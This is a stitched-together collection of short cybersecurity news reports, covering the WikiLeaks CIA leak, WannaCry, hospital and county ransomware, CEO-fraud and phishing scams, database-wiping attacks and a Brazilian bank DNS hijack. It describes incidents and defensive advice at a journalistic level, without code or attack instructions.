The dump comprises 8,761 documents and files from a network of the Center for Cyber Intelligence.
A CIA spokeswoman declined to comment specifically.
“We do not comment on the authenticity or content of purported intelligence documents,” says Heather Fritz Horniak.
The authenticity of the posted documents in links from the WikiLeaks site could not be independently verified.
Last year, WikiLeaks disseminated internal email communications following a hack—purportedly aided by the Russian government—of the Democratic National Committee and the Hillary Clinton campaign.
The group says the Center for Cyber Intelligence's archive was circulated in an ""unauthorized manner"" among former U.S. government hackers and contractors, one of whom provided WikiLeaks with portions of the archive.
“This extraordinary collection, which amounts to more than several hundred million lines of code, gives its possessor the entire hacking capacity of the CIA,” WikiLeaks states.
“Once a single cyber 'weapon' is 'loose' it can spread around the world in seconds, to be used by rival states, cyber mafia and teenage hackers alike”.
The violation highlights critical shortcomings in personnel practices, the realities of insider threats and the lack of adequate controls, even within the intelligence community.
""It’s too easy for data to be stolen, even—allegedly—within the CIA’s Center for Cyber Intelligence,"" says Brian Vecci, technical evangelist at Varonis, a software company focused on data protection against insider threats, data breaches and ransomware attacks ""The entire concept of a spook is to be covert and undetectable; apparently that also applies to actions on their own network.
The CIA is not immune to issues affecting many organizations: too much access with too little oversight and detective controls.""
A Forrester study noted that more 90 percent of data security professionals experience challenges with data security, and 59 percent of organizations do not restrict access to files on a need-to know-basis, Vecci points out.
""In performing forensics on the actual breach, the important examination is to determine how 8,761 files just walked out of one of the most secretive and confidential organizations in the world,"" he continues.
""Files that were once useful in their operations are suddenly lethal to those same operations.
We call this toxic data, anything that is useful and valuable to an organization but once stolen and made public turns toxic to its bottom line and reputation.
All you have to do is look at Sony, Mossack Fonseca and the DNC to see the effects of this toxic data conversion.
""Organizations need to get a grip on where their information assets are, who is using them, and who is responsible for them,"" Vecci concludes.
They need to put all that data lying around in the right place, restrict access to it and monitor and analyze who is using it.""
Tuesday’s document dump mirrors the one WikiLeaks carried out when it exposed cyber toolkits used by the National Security Agency, and frankly, is not that surprising of revelation at all, offers Richard Forno, assistant director at the University of Maryland, Baltimore County Center for Cybersecurity and director of the Cybersecurity Graduate Program.
“The big takeaway is that it shows the CIA is just as capable of operating in the cyberspace as the NSA,” Forno says.
The CIA’s cyber focus reinforces the idea that security in this domain is just as important as others for national security and solidifies the U.S. government’s commitment in the area, Forno offers.
WikiLeaks contends that the CIA and its contractors developed malware and hacking tools for targeted surveillance efforts, tapping otherwise ordinary devices such as cellphones, computers, televisions and automobiles to spy on targets.
Some cases involved CIA collaboration with the United Kingdom’s intelligence MI5/BTSS, WikiLeaks states.
It maintains the CIA’s Mobile Devices Branch developed malware to penetrate cellphone securities and could be tapped to send CIA users’ geolocation information, audio and text files and covertly activate the phones’ cameras and microphones.
“These techniques permit the CIA to bypass the encryption of WhatsApp, Signal, Telegram, Wiebo, Confide and Cloackman by hacking the ‘smart’ phones that they run on and collecting audio and message traffic before encryption is applied,” the group states.

Tenable was behind one software update to fix security flaws that’s circulating this week.
The research arm of the Columbia-based cybersecurity company discovered a vulnerability in Zoom’s conferencing platform that would allow attackers to take control of a user’s desktop remotely during a meeting.
After being alerted, Tenable said that Zoom quickly updated the software.
According to Tenable, the security flaw, if exploited, would allow attackers to do the following:
    Hijack control of a screen, allowing them to download and execute malware.
    Impersonate others in the meeting through chat messages.
    Kick out other attendees of the meeting.
A blog post from the company states the vulnerability was discovered by Tenable’s David Wells.
“This impacts both one-on-one (P2P) meetings as well as group meetings streamed through Zoom servers,” the blog post states, adding that the vulnerability could also be exploited over Wide Area Network (WAN).
The vulnerability could’ve put 750,000 companies that use Zoom at risk.
To fix the vulnerability, Zoom patched servers and released new versions of the software. The company is urging users to ensure their software is up-to-date.
This vulnerability is the perfect example of the cyber attack surface that is expanded by seemingly innocuous services, like Zoom,” Tenable CTO Renaud Deraison said in a statement.

Barts Health Trust, which runs The Royal London, St Bartholomew's, Whipps Cross, Mile End and Newham hospitals, is investigating the breach.
The trust said it could now rule out ransomware, in which email recipients are tricked into opening attachments which contain viruses, as the cause.
It has not confirmed how much of its system was affected but said there was no sign that patient data was accessed.
In a statement said: ""We are urgently investigating this matter and have taken a number of drives offline as a precautionary measure.
""We have tried and tested contingency plans in place and are making every effort to ensure that patient care will not be affected.""
The incident follows a similar attack on the Northern Lincolnshire and Goole Foundation Trust in October, when malware was used to encrypt files on the trust's system and demand a ransom in order to access them again.
The trust did not pay out, but was forced to cancel patient appointments while its systems were shut down to remove the virus.

Social media phishing attacks jumped by a massive 500% in Q4, driven by a huge increase in fraudulent accounts including many posing as customer support for big name brands, according to Proofpoint.
The security vendor revealed the findings in its Q4 2016 Threat Summary and Year in Review report.
It claimed fraudulent accounts across sites like Twitter and Facebook increased 100% from the third to fourth quarter.
Such accounts are used for phishing, malware distribution, spam and other ends. In fact, Proofpoint observed a 20% increase in Facebook and Twitter spam from Q3 to Q4, with the quarter recording the second highest spam volume in the year.
Yet it was a particular variety of phishing that caught the eye.
So-called “angler phishing” is a relatively new tactic in which the black hats register fake Twitter accounts that masquerade as customer support accounts.
They monitor the real support accounts for irate customer messages and then quickly jump in to send messages back to those users loaded with malicious links.
The tactic was particularly common among financial services and entertainment accounts, according to the report.
Elsewhere, the number of new ransomware variants grew 30-fold over Q4, and malicious email campaigns grew significantly, with Q4's largest campaign 6.7 times the size of Q3's.
Some of the biggest campaigns apparently involved hundreds of millions of messages dropping Locky ransomware.
However, there was some good news, with scams involving the spoofing of CEO emails sent to CFOs falling 28% in the final quarter.
This is partly because CFOs are more cautious about the veracity of such messages, but can also be linked to a 33% surge in DMARC implementation which helped to block attempts to spoof the CEO’s email address.
In addition, exploit kits remained at low levels of activity after some high profile Angler EK arrests in Q2, although large scale malvertising campaigns persisted, Proofpoint claimed.

The White House has publicly blamed North Korea for a ransomware attack in May that locked more than 300,000 computers in 150 countries.
""North Korea has acted especially badly, largely unchecked, for more than a decade,"" Homeland Security adviser Tom Bossert said at a White House briefing Tuesday morning.
He called the WannaCry attack a reckless attack that caused ""havoc and destruction"" by locking vital information away from users, including hospital networks.
""We believe now we have the evidence to support this assertion,"" Bossert said. ""It's very difficult to do when you're looking for individual hackers. In this case, we found a concerted effort.""
In an opinion piece published in The Wall Street Journal on Monday, Bossert wrote that after careful investigation, Washington can say that Pyongyang is ""directly responsible"" for the WannaCry virus.
Bossert called the attack in which victims received ransom demands to unlock their computers ""cowardly, costly and careless.""
""The consequences and repercussions of WannaCry were beyond economic,"" he wrote. ""The malicious software hit computers in the U.K.'s health-care sector particularly hard, compromising systems that perform critical work. These disruptions put lives at risk.""
Bossert is expected to brief reporters on Tuesday about the hacking.
NPR's Elise Hu tells Morning Edition that ""cyberattacks are a way for North Korea to punch above its weight"" and that Pyongyang's hackers ""have access to global networks and the Internet, and they have some real successes to count.""
Within days of the attack in May, North Korea fell under suspicion. As NPR's Bill Chappell reported at the time, WannaCry was found to have ""lines of code that are identical to work by hackers known as the Lazarus Group, [which has] ... been linked to North Korea, raising suspicions that the nation could be responsible.""
And in October, Britain's Minister of State for Security Ben Wallace said his government was ""as sure as possible"" that Pyongyang launched the attack.
Bossert said in the Journal that President Trump had ""ordered the modernization of government information-technology to enhance the security of the systems we run on behalf of the American people.""
""We also indicted Russian hackers and a Canadian acting in concert with them. A few weeks ago, we charged three Chinese nationals for hacking, theft of trade secrets and identity theft. There will almost certainly be more indictments to come,"" he wrote.
He said that the administration would continue to use its ""maximum pressure strategy to curb Pyongyang's ability to mount attacks, cyber or otherwise.""

Newark's Service Director David Rhodes said the city's system has not been hurt by the cyber attack and nothing like that has happened to the city before.
Steve Baum, Newark's safety director, said the city is using the unfortunate incident to educate city employees on best practices for computers.
""We get complacent because everybody uses computers every day and sometimes we just need to be reminded,"" he said.
A computer virus discovered late Tuesday caused Licking County government to shut down its computers and phone systems indefinitely to prevent the virus from spreading, protect data and preserve evidence.
The FBI and Bureau of Criminal Investigation have been notified.
The virus, accompanied by a financial demand, is labeled ransomware, which has hit several local governments in Ohio and was the subject of a warning from the state auditor last summer.
One tip, Baum said, is not to open personal emails on a work computer and don't open emails or attachments from unknown senders.
Baum said in the past city employees have said something if they've received questionable emails.
""If they see something that seems suspicious about their computer or an email that they got or something like that, but they’ve opened it and they notify somebody, we can shut that section down and isolate the problem as quick as possible and minimize the amount of damage that it does,"" he said.

Locky ransomware attacks have dramatically decreased during December 2016, according to Check Point.
Locky, which uses massive spam campaigns as a major distribution vector, only surfaced in 2016 but has rapidly become one of the most popular tools for cybercriminals, part of a growing trend for ransomware cyberattacks that encrypt data on the target machine and demand payment in return for decrypting it.
In December, researchers recorded an 81% drop in the average number of Locky infections per week, compared with the weekly averages of October and November causing it to drop out of the top 10 global malware families for the first time since June 2016.
Overall, they tracked an 8% decrease in the number of recognized malware attacks on organizations in December, which could be attributed to a Christmas holiday slowdown.
Research also revealed the most prevalent mobile malware during December 2016, and once again attacks against Android devices significantly more common than iOS.

You may have heard of the CEO scam: that’s where spear-phishers impersonate a CEO to hit up a company for sensitive information.
That’s what happened to Snapchat, when an email came in to its payroll department, masked as an email from CEO Evan Spiegel and asking for employee payroll information.
Here’s a turn of that same type of screw: the Internal Revenue Service (IRS) last week sent out an urgent warning about a new tax season scam that wraps the CEO fraud in with a W-2 scam, then adds a dollop of wire fraud on top.
A W-2 is a US federal tax form, issued by employers, that has a wealth of personal financial information, including taxpayer ID and how much an employee was paid in a year.
This new and nasty dual-phishing scam has moved beyond the corporate world to target nonprofits such as school districts, healthcare organizations, chain restaurants, temporary staffing agencies and tribal organizations.
As with earlier CEO spoofing scams, the crooks are doctoring emails to make the messages look like they’re coming from an organization’s executive.
Sending the phishing messages to employees in payroll or human resources departments, the criminals request a list of all employees and their W-2 forms.
The scam, sometimes referred to as business email compromise (BEC) or business email spoofing (BES), first appeared last year.
This year, it’s not only being sent to a broader set of intended victims; it’s also being sent out earlier in the tax season than last year.
In a new twist, this year’s spam scamwich also features a followup email from that “executive”, sent to payroll or the comptroller, asking for a wire transfer to a certain account.
Some companies have been swindled twice: they’ve lost both employees’ W-2s and thousands of dollars sent out via the wire transfers.

A new variant of the WannaCry ransomware attack surfaced on Monday, according to cyber security firm Check Point Software, which it said it had stopped from damaging computers by activating a ""kill switch"" in the software.
The company discovered the new variant at about 7am New York time on Monday, as it was infecting computers at a rate of about one per second, said Check Point researcher Maya Horowitz.
The firm responded by setting up a server that initiated what is called a kill switch built into the software, which prevents it from encrypting data on infected machines or spreading to other computers, she said.
Ransomware is illicit software that demands a ""ransom"" from an infected user to regain control of their computer.

Coventry Trading Standards is again warning Apple Store users to be aware of phishing emails attempting to steal your Apple ID log in details as well as personal and financial information.
A Westwood resident reported receiving an authentic looking email ‘invoice’ from the Apple Store in regards to an order that was placed. At the end of the email, there is a link to ‘View Your Order’.
If you click on this link, you will no doubt be taken to a fake server and a page asking you to provide personal information, including full credit/debit card details.
Criminals can then steal any information that you supply and use it to hijack your Apple account, commit credit card fraud in your name, and attempt to steal your identity.
The Apple Store will never ask you to provide personal details (such as passwords or credit card numbers) via email.
If you do have a genuine Apple account, you can check it with Apple directly, but do not use any links in the email. Just type the site's address into your browser.
If you receive what you think is a phishing email claiming to be from Apple you can forward it to them. Full details are available on the Apple website.

Google and Facebook have confirmed that they fell victim to an alleged $100m (£77m) scam.
In March, it was reported that a Lithuanian man had been charged over an email phishing attack against ""two US-based internet companies"" that were not named at the time.
They had allegedly been tricked into wiring more than $100m to the alleged scammer's bank accounts.
On 27 April, Fortune reported that the two victims were Facebook and Google.
The man accused of being behind the scam, Evaldas Rimasauskas, 48, allegedly posed as an Asia-based manufacturer and deceived the companies from at least 2013 until 2015.
""Fraudulent phishing emails were sent to employees and agents of the victim companies, which regularly conducted multimillion-dollar transactions with [the Asian] company,"" the US Department of Justice (DOJ) said in March.
These emails purported to be from employees of the Asia-based firm, the DOJ alleged, and were sent from email accounts designed to look like they had come from the company, but in fact had not.
The DOJ also accused Mr Rimasauskas of forging invoices, contracts and letters ""that falsely appeared to have been executed and signed by executives and agents of the victim companies"".
""We detected this fraud against our vendor management team and promptly alerted the authorities,"" a spokeswoman for Google said in a statement.
""We recouped the funds and we're pleased this matter is resolved.""
However, the firm did not reveal how much money it had transferred and recouped.
Nor did Facebook - but a spokeswoman said: ""Facebook recovered the bulk of the funds shortly after the incident and has been cooperating with law enforcement in its investigation.""

The ransomware attack targeting global hospitals, governments and telecoms using a leaked National Security Agency (NSA) exploit may be the result of a ""targeted attack gone horribly wrong"", according to a team of well-regarded security researchers.
Experts from Recorded Future, a threat intelligence company headquartered in the US, say analysis of the hackers' bitcoin addresses – set up to receive money from infected computers – indicates the attackers were unprepared for such a widespread incident.
""A part of carefully planned large-scale ransomware attack requires a separate bitcoin address for each victim, guaranteeing the miscreant controlling the operation would later be able to identify the payment and decrypt the correct system,"" wrote security expert John Wetzel in a blog post.
He said in the WannaCry ransomware campaign, however, only a ""handful"" of wallets were used.
""Such unusual behaviour suggests the current epidemic was never planned by criminals, and resulted from targeted attacks going horribly wrong,"" he added.
At the time of writing, the criminals' bitcoin wallets have received over $40,000 worth of bitcoin, a type of cryptocurrency. All funds remain untouched.
The security firm said the inaction is likely due to ""intense scrutiny"" of police and investigators.
""Unintended or not, the scale and scope of damage in this attack is unprecedented. Criminals will utilise any method available in their pursuit of monetary gain. While the gain in this attack was limited, the damage was massive, and possibly avoidable,"" Wetzel noted.
Recorded Future is just one of many firms probing the malware – which was exploiting the same Microsoft Windows vulnerability as a leaked NSA exploit called EternalBlue.
The bug, patched in March 2017, targeted the SMB (Server Message Block), experts found.
Microsoft has been outspoken on the topic of the NSA storing vulnerabilities for its software.
""Repeatedly, exploits in the hands of governments have leaked into the public domain and caused widespread damage,"" said the firm's president, Brad Smith, on 14 May.
""We expect to see further attacks from variants of this malware,"" warned Recorded Future, adding: ""The best advice is to update your antivirus on endpoints, to ensure that all Windows systems are fully patched, to configure firewalls to block access to SMB and RDP ports.""
On 15 May, as the UK working week was set to begin, fears mounted that a second round of infections could take place. According to Kaspersky Lab's Costin Raiu, the malware was still in circulation, but appeared to be less widespread than previously predicted.
""Kaspersky Lab has noted about 500 new attempted WannaCry attacks across its customer base – by comparison, on 12 May (Friday) there were six times as many attempts during the first hour alone. This suggests the infection may be coming under control,"" Raiu said.
Security experts, including MalwareTech and Matt Suiche, worked through the weekend (13-14 May) to locate so-called ""kill-switches"" that could curb the spread of the ransomware. At the same, law enforcement around the world launched investigations into the incident.

Sensitive information related to the United States Air Force has been found exposed publicly on the internet, allowing anyone with a web connection to peruse them without authorisation and no need for a password.
The discovery was made by security researchers at MacKeeper who said that they had found gigabytes of files on an internet-connected backup drive that was not password-protected:
The most shocking document was a spreadsheet of open investigations that included the name, rank, location, and a detailed description of the accusations.
The investigations range from discrimination and sexual harassment to more serious claims.
One example is an investigation into a Major General who is accused of accepting $50k a year from a sports commission that was supposedly funneled into the National Guard.
As ZDNet reports, the names and addresses, ranks, and social security numbers of more than 4000 US Air Force officers were included in the stash of personal information.
Further documents included phone numbers and contact information for workers and their spouses.
Clearly some of the details exposed through the security lapse would be of value to foreign intelligence agencies and criminal gangs, and could lead to blackmail attempts or identity theft.
What we don’t know is how long the information has been accessible online, and we also do not know if anyone other than the security researchers had managed to stumble across the exposed information.
But the truth of the matter is that we shouldn’t ever have to find ourselves in a question to ask such questions.
Whenever you decide to store information on the internet, particularly sensitive data, you should be doing your utmost to ensure that you have minimised the risk of it falling into the wrong hands.
That means always keeping your computer patched and running an up-to-date anti-virus, using encryption, enabling passwords and ensuring that the password chosen is a strong one, turning on additional authentication checks such as two-step verification and restricting the range of trusted IP addresses from where users can login from.

Researchers are now observing similar destructive attacks hitting openly accessible Hadoop and CouchDB deployments.
Security researchers Victor Gevers and Niall Merrigan, who monitored the MongoDB and Elasticsearch attacks so far, have also started keeping track of the new Hadoop and CouchDB victims.
The two have put together spreadsheets on Google Docs where they document the different attack signatures and messages left behind after data gets wiped from databases.
In the case of Hadoop, a framework used for distributed storage and processing of large data sets, the attacks observed so far can be described as vandalism.
That's because the attackers don't ask for payments to be made in exchange for returning the deleted data.
Instead, their message instructs the Hadoop administrators to secure their deployments in the future.
According to Merrigan's latest count, 126 Hadoop instances have been wiped so far.
The number of victims is likely to increase because there are thousands of Hadoop deployments accessible from the internet -- although it's hard to say how many are vulnerable.
The attacks against MongoDB and Elasticsearch followed a similar pattern.
The number of MongoDB victims jumped from hundreds to thousands in a matter of hours and to tens of thousands within a week.
The latest count puts the number of wiped MongoDB databases at more than 34,000 and that of deleted Elasticsearch clusters at more than 4,600.
A group called Kraken0, responsible for most of the ransomware attacks against databases, is trying to sell its attack toolkit and a list of vulnerable MongoDB and Elasticsearch installations for the equivalent of US$500 in bitcoins.
The number of wiped CouchDB databases is also growing rapidly, reaching more than 400 so far.
CouchDB is a NoSQL-style database platform similar to MongoDB.
Unlike the Hadoop vandalism, the CouchDB attacks are accompanied by ransom messages, with attackers asking for 0.1 bitcoins (around $100) to return the data.
Victims are advised against paying because, in many of the MongoDB attacks, there was no evidence that attackers had actually copied the data before deleting it.
Researchers from Fidelis Cybersecurity have also observed the Hadoop attacks and have published a blog post with more details and recommendations on securing such deployments.

Hawksmoor Investment Management has sought to reassure clients after it was the victim of a cyber attack earlier this week.
The discretionary investment manager, which runs £711m on behalf of clients, has emailed investors to let them know it was the target of an attack on its IT systems.
Phishing emails were sent out to clients on Tuesday (17 January) purporting to be from the company’s business development manager, Jill Gill.
In an email sent out today (19 January), Hawksmoor chief executive John Crowley apologised to clients, but said the IT team had quickly identified and resolved the issue.
He also said the team had taken “immediate steps” to prevent this kind of incident from happening again.
“Hawksmoor treats confidentiality and data protection extremely seriously, and I can assure you that no client data was compromised at any stage,” he said.
Mr Crowley advised clients to delete any emails they received from Ms Gill between 3pm and 4pm on the 17 January.
He also recommended that customers change their password if they opened any link on the emails.
Last year, the head of cyber technology firm ZoneFox said companies should implement a framework to guard against breaches to their data security.

The government of Licking County in the US has taken many of its computer and telephone systems offline as it tries to tackle a ransomware infection.
Ransomware is a type of computer malware that scrambles data and demands a fee for it to be restored.
Citizens have been told they must visit government offices to do tasks usually completed online or by phone.
The county commissioner told local media that he was taking advice from cybersecurity experts and the FBI.
Licking County, which is in Ohio, has about 170,000 residents.
The local government says it has about 1,000 computers and 12 servers, which have been taken offline making many government websites inaccessible.
Many of the county's public services, including the emergency services, have resorted to working in ""manual mode"" without their computers, to prevent the malware being spread to more devices.
Residents are still able to call 911 in an emergency but the process may take longer than usual.
""It's slower than we'd like,"" Sean Grady, director of the Licking County Emergency Management Agency, told the Newark Advocate.
""It takes us back 25 years in how we dispatch. We ask more detailed questions.""
County commissioner Tim Bubb said the malware was a ""crime against the people of Licking County"" but added that the government had not been specifically targeted.
""Clearly, it's designed to make money for somebody. It was just our unlucky day,"" he said.
Some variants of ransomware have previously been defeated, with removal instructions now available online.
However, security experts warn that in some cases the only way to get data back is by restoring from a back-up.
Mr Bubb said he was exploring that option, but did not know how long it would take for computer systems to be back online.
""We're evaluating our back-ups. We think our back-ups are pretty darn good,"" he said.

An amount in Bitcoin (BTC) is what the Canadian town of Midland is said to have paid to regain access to its hacked computer systems.
The ransom that the Canadian town of Midland has paid to cyber criminals to have its servers unblocked was in the form of Bitcoin (BTC), media source Global News reported last week, quoting a local spokesperson. How much Midland has paid in cryptocurrency, however, was not specified.
On September 1, the town in the Ontario province became a victim of a malware attack, as hackers managed to encrypt the information stored on several town systems, leaving them virtually unusable. Right after, Midland got a ransom demand to get decryption keys. The town authorities decided a few days later to pay the sum.
    “Although not ideal, it is in our best interest to bring the system back online as quickly as possible. The Town had previously secured an insurance policy to cover such circumstances. Decryption efforts are underway,” a statement on Midland’s web site reads.

Where there’s a will, there’s a way, and scammers are finding increasingly cunning ways to capitalise on the reach and popularity of the world’s global brands.
This time PayPal is the target, according to Proofpoint.
The company recently discovered a phishing email message which looked like a benign PayPal login, but in reality it was a “very well crafted” phishing webpage.
The page is available in multiple languages, which makes it seem all the more legitimate and across many different regions.
Behind the scenes, the phishing attack turned out to be complex and sophisticated, and Proofpoint says those are the real innovations.
The phishing attempts feature embedded URLs that direct users to the fake PayPal login.
This is done using a decommissioned PayPal service that allows a person to buy a gift card from a user.
The phishing attack then starts with a ‘reassuring welcome page’, Proofpoint says.
Users are then asked to confirm the credit card information.
After the phishing kit validates the card, it asks users to enter security information about the card, the link to their bank account and details and identification.
Proofpoint says that the particular phishing kit shows how ‘crimeware as a service’ is rapidly advancing, and will become a more common technique.
Proofpoint says it has notified PayPal of the phishing campaign and the findings.

Will Strafach, CEO of Sudo Security Group, said he found 76 iOS apps that are vulnerable to an attack that can intercept protected data.
TLS is used to secure an app’s communication over an internet connection.
Without it, a hacker can essentially eavesdrop over a network to spy on whatever data the app sends, such as login information.
“This sort of attack can be conducted by any party within Wi-Fi range of your device while it is in use,” Strafach said.
“This can be anywhere in public, or even within your home if an attacker can get within close range”.
Strafach discovered the vulnerability in the 76 apps by scanning them with his company-developed security service, verify.ly, which he's promoting.
It flagged “hundreds of applications” with a high likelihood of data interception.
He’s so far confirmed that these 76 apps possess the vulnerability.
He did so by running them on an iPhone running iOS 10 and using a proxy to insert an invalid TLS certificate into the connection.
Strafach declared that 43 of the apps were either a high or medium risk, because they risked exposing login information and authentication tokens.
Some of them are from “banks, medical providers, and other developers of sensitive applications,” he said.
He's not disclosing their names, to give them time to patch the problem.
The remaining 33 apps were deemed low risks because they revealed only partially sensitive data, such as email addresses.
They include the free messaging service ooVoo, video uploaders to Snapchat and lesser-known music streaming services, among many others.
In all, the 76 apps have 18 million downloads, according to app market tracker Apptopia, Strafach said.
It’ll be up to the app developers to fix the problem, but it only involves changing a few lines of code, says Strafach, who’s been trying to contact the developers.
He included some warnings for developers in the blog post.
“Be extremely careful when inserting network-related code and changing application behaviors,” he wrote.
“Many issues like this arise from an application developer not fully understanding the code they’ve borrowed from the web”.
Users of affected apps can protect themselves by turning off the Wi-Fi when in a public location, Strafach says.
That will force the phone to use a cellular connection to the internet, making it much harder for any hacker to eavesdrop unless they use expensive and illegal equipment, Strafach said.

Are you such a video game fanatic that you simply can’t wait to get your paws on sneak previews of upcoming hit titles?
If so, your fervour may be fuelling the criminal activities of an unnamed group of who have targeted a developer of highly popular video games.
Best known for developing The Witcher series of role-playing video games, CD Projekt Red took to Twitter to announce that it had been approached by extortionists who claimed to have stolen files from the company, including “documents connected to early designs for the upcoming game, Cyberpunk 2077.”
CD Projekt Red says it will not pay the ransom being demanded by the thieves, who are threatening to release the stolen files to the general public:
“We will not be giving in to the demands of the individual or individuals that have contacted us, which might eventually lead to the files being published online. The appropriate legal authorities will be informed about the situation.”
“The documents are old and largely unrepresentative of the current vision for the game. Still, if you’re looking forward to playing Cyberpunk 2077, it would be best for you to avoid any information not coming directly from CD PROJEKT RED.”
I applaud CD Projekt Red’s refusal to pay a ransom. Paying extortionists always runs the risk of encouraging blackmailers to strike again, putting not just your own company but others at further risk.
No release date has yet been announced by the Polish game studio for Cyberpunk 2077, which has been in development for years and is keenly anticipated by the game maker’s fans.
For CD Projekt RED, the danger is not just whether assets belonging to the game leaking into the public domain mess up its marketing strategy. There is also the risk that the gaming community will be unimpressed with any sneak previews of early versions of the game stolen by the hackers, and puncture the hype machine.
Recent months have seen a rise in attacks where hackers have threatened to release a company’s intellectual property onto the net unless a ransom is paid.
A month ago, for instance, The Dark Overlord hacking group attempted to blackmail money out of Netflix, before deciding to leak as-yet unaired episodes of hit TV show “Orange is the New Black.”
The same hacking group has previously published 180,000 medical records – including insurance and social security numbers, dates of birth, and payment information – after healthcare firms refused to give in to their demands.
Most recently, a chain of cosmetic surgeries in Lithuania warned that hackers were threatening to release the personal details of clients, including photographs.
Readers with longer memories may recall that in September 2003, a German hacker leaked the source code of the game Half-Life 2 onto the internet, much to the delight of internet users who had become fed up with waiting for the long-awaited video game.
It doesn’t matter that it’s not credit card data or passwords that are being stolen – theft is theft. Just because it’s a video game’s plans and designs that are being held for ransom by the hackers doesn’t make any difference. The threat is real – and could have a commercial impact on the game’s producer.
CD Projekt Red should be applauded for being so transparent about what has happened, as it’s easy to imagine many firms would rather sweep bad news like this under the carpet. What we need now is for game fanatics to exercise some patience and self-control, and resist the urge to hunt out a game before the manufacturer is ready to release it officially themselves.

Apple is reassuring customers that its systems have not been breached while a hacker, or hackers, threaten to remotely wipe hundreds of millions iPhones of all their data, including photos, videos, and messages.
The hackers are using an alleged cache of stolen email accounts and passwords as leverage in an attempt to extort the world’s most valuable company.
They claim to have access to as many as 559 million Apple email and iCloud accounts, Vice blog Motherboard reported on Tuesday.
The group, calling itself “Turkish Crime Family,” said it would delete its alleged list of compromised login credentials only after Apple pays it $75,000 in cryptocurrency, either Bitcoin or rival Ether, or $100,000 worth of iTunes gift cards, Motherboard reported.
The group has given Apple (aapl) a deadline of April 7 to meet its demands.
Though Apple has not officially confirmed the authenticity of the data that the hackers say they have, an Apple spokesperson told Fortune in an emailed statement that, if the list is legitimate, it was not obtained through any hack of Apple.
“There have not been any breaches in any of Apple’s systems including iCloud and Apple ID,” the spokesperson said.
“The alleged list of email addresses and passwords appears to have been obtained from previously compromised third-party services”.
A person familiar with the contents of the alleged data set said that many of the email accounts and passwords contained within it matched data leaked in a past breach at LinkedIn.
The company representative declined to elaborate on what steps Apple had taken to monitor the situation.
The spokesperson merely noted that such measures, whatever they may be, are “standard procedure”.
Apple customers who secure their iCloud accounts with the same passwords they use on other online accounts—especially ones at LinkedIn, Yahoo (yhoo), Dropbox, and other sites recently revealed to have suffered big breaches over the past few years—should adopt new passwords that are long, strong, and unique.
Many security experts also recommend storing them in a password manager, and activating two-factor authentication, an additional layer of security, where available.

The traditional model of hacking a bank isn't so different from the old-fashioned method of robbing one.
But one enterprising group of hackers targeting a Brazilian bank seems to have taken a more comprehensive and devious approach: One weekend afternoon, they rerouted all of the bank's online customers to perfectly reconstructed fakes of the bank's properties, where the marks obediently handed over their account information.
Researchers at the security firm Kaspersky on Tuesday described an unprecedented case of wholesale bank fraud, one that essentially hijacked a bank's entire internet footprint.
In practice, that meant the hackers could steal login credentials at sites hosted at the bank's legitimate web addresses.
Kaspersky researchers believe the hackers may have even simultaneously redirected all transactions at ATMs or point-of-sale systems to their own servers, collecting the credit card details of anyone who used their card that Saturday afternoon.
""Absolutely all of the bank's online operations were under the attackers' control for five to six hours,"" says Dmitry Bestuzhev, one of the Kaspersky researchers who analyzed the attack in real time after seeing malware infecting customers from what appeared to be the bank's fully valid domain.
From the hackers' point of view, as Bestuzhev puts it, the DNS attack meant that ""you become the bank.
Kaspersky isn't releasing the name of the bank that was targeted in the DNS redirect attack.
But the firm says it's a major Brazilian financial company with hundreds of branches, operations in the US and the Cayman Islands, 5 million customers, and more than $27 billion in assets.
And though Kaspersky says it doesn't know the full extent of the damage caused by the takeover, it should serve as a warning to banks everywhere to consider how the insecurity of their DNS might enable a nightmarish loss of control of their core digital assets.
""This is a known threat to the internet,"" Bestuzhev says.
""But we’ve never seen it exploited in the wild on such a big scale.""
But attacking those records can take down sites or, worse, redirect them to a destination of the hacker's choosing.
In 2013, for instance, the Syrian Electronic Army hacker group altered the DNS registration of The New York Times to redirect visitors to a page with their logo.
More recently, the Mirai botnet attack on the DNS provider Dyn knocked a major chunk of the web offline, including Amazon, Twitter, and Reddit.
But the Brazilian bank attackers exploited their victim's DNS in a more focused and profit-driven way.
Kaspersky believes the attackers compromised the bank's account at Registro.br.
That's the domain registration service of NIC.br, the registrar for sites ending in the Brazilian .br top-level domain, which they say also managed the DNS for the bank.
And those sites even had valid HTTPS certificates issued in the name of the bank, so that visitors' browsers would show a green lock and the bank's name, just as they would with the real sites.
Kaspersky found that the certificates had been issued six months earlier by Let's Encrypt, the non-profit certificate authority that's made obtaining an HTTPS certificate easier in the hopes of increasing HTTPS adoption.
""If an entity gained control of DNS, and thus gained effective control over a domain, it may be possible for that entity to get a certificate from us,"" says Let's Encrypt founder Josh Aas.
""Such issuance would not constitute mis-issuance on our part, because the entity receiving the certificate would have been able to properly demonstrate control over the domain.""
Ultimately, the hijack was so complete that the bank wasn't even able to send email.
""They couldn’t even communicate with customers to send them an alert,"" Bestuzhev says.
""If your DNS is under the control of cybercriminals, you’re basically screwed.""
Aside from mere phishing, the spoofed sites also infected victims with a malware download that disguised itself as an update to the Trusteer browser security plug-in that the Brazilian bank offered customers.
According to Kaspersky's analysis, the malware harvests not just banking logins—from the Brazilian banks as well as eight others—but also email and FTP credentials, as well as contact lists from Outlook and Exchange, all of which went to a command-and-control server hosted in Canada.
The Trojan also included a function meant to disable antivirus software; for infected victims, it may have persisted far beyond the five-hour window when the attack occurred.
And the malware included scraps of Portugese language, hinting that the attackers may have themselves been Brazilian.
After around five hours, Kaspersky's researchers believe, the bank regained control of its domains, likely by calling up NIC.br and convincing it to correct the DNS registrations.
But just how many of the bank's millions of customers were caught up in the DNS attack remains a mystery.
Kaspersky says the bank hasn't shared that information with the security firm, nor has it publicly disclosed the attack.
But the firm says it's possible that the attackers could have harvested hundreds of thousands or millions of customers' account details not only from their phishing scheme and malware but also from redirecting ATM and point-of-sale transactions to infrastructure they controlled.
Kaspersky's Bestuzhev argues that, for banks, the incident should serve as a clear warning to check on the security of their DNS.
He notes that half of the top 20 banks ranked by total assets don't manage their own DNS, instead leaving it in the hands of a potentially hackable third party.
And regardless of who controls a bank's DNS, they can take special precautions to prevent their DNS registrations from being changed without safety checks, like a ""registry lock"" some registrars provide and two-factor authentication that makes it far harder for hackers to alter them.
Without those simple precautions, the Brazilian heist shows how quickly a domain switch can undermine practically all other security measures a company might implement.

